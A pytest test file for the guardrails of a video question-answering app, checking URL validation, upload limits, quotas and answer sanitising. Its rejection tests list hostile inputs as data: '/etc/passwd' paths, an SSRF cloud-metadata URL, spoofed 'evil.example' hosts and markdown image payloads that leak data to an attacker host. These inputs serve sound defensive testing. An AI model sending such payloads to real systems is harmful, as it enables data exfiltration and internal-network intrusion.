import pytest

from core import guardrails
from core.errors import GuardrailError, QuotaExceeded, UserFacingError
from core.settings import get_settings


@pytest.mark.parametrize("url", [
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "https://youtu.be/dQw4w9WgXcQ",
    "https://m.youtube.com/watch?v=dQw4w9WgXcQ",
    "https://music.youtube.com/watch?v=dQw4w9WgXcQ",
    "http://youtube.com/shorts/dQw4w9WgXcQ",
    "https://WWW.YOUTUBE.COM/watch?v=dQw4w9WgXcQ",
    "  https://www.youtube.com/watch?v=dQw4w9WgXcQ  ",
])
def test_youtube_links_accepted(url):
    assert guardrails.validate_video_url(url) == url.strip()


@pytest.mark.parametrize("url", [
    "",
    # Server paths: the old app treated anything that wasn't http(s) as a file to read.
    "downloads/someone-elses-upload.mp4",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "file:///etc/passwd",
    # Other hosts, including internal addresses (SSRF).
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8501/",
    "https://vimeo.com/123",
    "https://youtube.com.evil.example/watch?v=x",
    "https://evil.example/youtube.com/watch?v=x",
    "https://evil.example\\@youtube.com/",
    "https://user:pass@youtube.com/watch?v=x",
    "https://youtube.com:8080/watch?v=x",
    "https://youtube.com:99999/watch?v=x",
    "ftp://youtube.com/watch?v=x",
    "javascript:alert(1)",
    "https://www.youtube.com/watch?v=a b",
    "https://www.youtube.com/watch?v=" + "a" * 400,
])
def test_other_links_rejected(url):
    with pytest.raises(GuardrailError):
        guardrails.validate_video_url(url)


def test_upload_format_comes_from_extension():
    assert guardrails.validate_upload("talk.MP4", 1000) == "mp4"
    assert guardrails.validate_upload("talk.m4a", 1000) == "mp4"
    assert guardrails.validate_upload("talk.mkv", 1000) == "matroska"


@pytest.mark.parametrize("name,size", [
    ("payload.exe", 1000),
    ("talk.mp4.exe", 1000),
    ("playlist.m3u8", 1000),
    ("no_extension", 1000),
    ("talk.mp3", 0),
    ("talk.mp3", 201 * 1024 * 1024),
])
def test_bad_uploads_rejected(name, size):
    with pytest.raises(GuardrailError):
        guardrails.validate_upload(name, size)


def test_question_length_and_empty(friend):
    with pytest.raises(GuardrailError):
        guardrails.check_question(friend, "   ")
    with pytest.raises(GuardrailError):
        guardrails.check_question(friend, "x" * 1001)
    assert guardrails.check_question(friend, "  what is MCP?  ") == "what is MCP?"


def test_question_rate_limit_applies_to_everyone(friend, owner, monkeypatch):
    monkeypatch.setenv("QUESTIONS_PER_MINUTE", "2")
    get_settings.cache_clear()
    for who in (friend, owner):
        guardrails.check_question(who, "q1")
        guardrails.check_question(who, "q2")
        with pytest.raises(QuotaExceeded):
            guardrails.check_question(who, "q3")


def test_daily_question_quota_spares_admins(friend, owner, monkeypatch):
    monkeypatch.setenv("QUESTIONS_PER_DAY", "1")
    get_settings.cache_clear()
    guardrails.check_question(friend, "q1")
    with pytest.raises(QuotaExceeded):
        guardrails.check_question(friend, "q2")
    guardrails.check_question(owner, "q1")
    guardrails.check_question(owner, "q2")


def test_video_quotas(friend, owner, monkeypatch):
    monkeypatch.setenv("VIDEOS_PER_DAY", "2")
    monkeypatch.setenv("AUDIO_MINUTES_PER_DAY", "60")
    get_settings.cache_clear()

    guardrails.check_can_start_video(friend)
    guardrails.charge_video(friend, 40)
    # 40 + 30 > 60: refused before transcription, and not counted.
    with pytest.raises(QuotaExceeded):
        guardrails.charge_video(friend, 30)
    guardrails.charge_video(friend, 20)
    with pytest.raises(QuotaExceeded):
        guardrails.check_can_start_video(friend)

    usage = guardrails.usage_summary(friend)
    assert (usage["videos"], usage["minutes"]) == (2, 60)

    # Admins are counted but never blocked.
    guardrails.charge_video(owner, 500)
    guardrails.check_can_start_video(owner)


def test_low_disk_pauses_videos_for_everyone(friend, owner, monkeypatch):
    monkeypatch.setenv("MIN_FREE_DISK_GB", "999999")
    get_settings.cache_clear()
    for who in (friend, owner):
        with pytest.raises(GuardrailError, match="low on storage"):
            guardrails.check_can_start_video(who)


def test_job_slots(monkeypatch):
    monkeypatch.setenv("MAX_CONCURRENT_JOBS", "2")
    get_settings.cache_clear()
    with guardrails.job_slot("a"):
        with pytest.raises(GuardrailError, match="already"):
            with guardrails.job_slot("a"):
                pass
        with guardrails.job_slot("b"):
            with pytest.raises(GuardrailError, match="busy"):
                with guardrails.job_slot("c"):
                    pass
    # Released even when the job fails.
    with pytest.raises(RuntimeError):
        with guardrails.job_slot("a"):
            raise RuntimeError("boom")
    with guardrails.job_slot("a"):
        pass


@pytest.mark.parametrize("text", [
    "See ![chart](https://evil.example/x?q=secret) here.",
    "![ref][1]\n\n[1]: https://evil.example/?q=2",
    "![ref]\n\n[ref]: https://evil.example/?q=3",          # shortcut reference
    "![a[b]c](https://evil.example/?q=4)",                  # nested brackets
    "![a\\]b](https://evil.example/?q=5)",                  # escaped bracket
    "[![x][r]][r]\n\n[r]: https://evil.example/?q=6",       # image inside a link
])
def test_clean_answer_neutralises_every_image(text):
    from markdown_it import MarkdownIt
    html = MarkdownIt("commonmark").render(guardrails.clean_answer(text))
    assert "<img" not in html


def test_clean_answer_keeps_ordinary_text():
    assert guardrails.clean_answer("A [link](https://example.com) stays. Wow!") == \
        "A [link](https://example.com) stays. Wow!"


def test_failed_attempts_are_capped(friend, monkeypatch):
    monkeypatch.setenv("VIDEOS_PER_DAY", "1")
    get_settings.cache_clear()
    for _ in range(3):
        guardrails.start_attempt(friend)
    with pytest.raises(QuotaExceeded, match="attempts"):
        guardrails.start_attempt(friend)


def test_charge_rechecks_video_count(friend, monkeypatch):
    monkeypatch.setenv("VIDEOS_PER_DAY", "1")
    get_settings.cache_clear()
    guardrails.check_can_start_video(friend)   # two tabs both pass this...
    guardrails.charge_video(friend, 5)
    with pytest.raises(QuotaExceeded):          # ...but only one gets charged
        guardrails.charge_video(friend, 5)


def test_user_message_hides_internals():
    assert guardrails.user_message(GuardrailError("Only YouTube links are supported.")) == \
        "Only YouTube links are supported."

    msg = guardrails.user_message(RuntimeError("C:\\srv\\data\\users\\x failed, key sk-abc123"))
    assert "sk-abc123" not in msg and "C:\\" not in msg
    assert "ref" in msg

    class RateLimitError(Exception):
        pass
    assert "rate-limiting" in guardrails.user_message(RateLimitError("Incorrect API key sk-..."))


def test_user_facing_errors_are_shown_as_is():
    assert isinstance(QuotaExceeded("x"), UserFacingError)
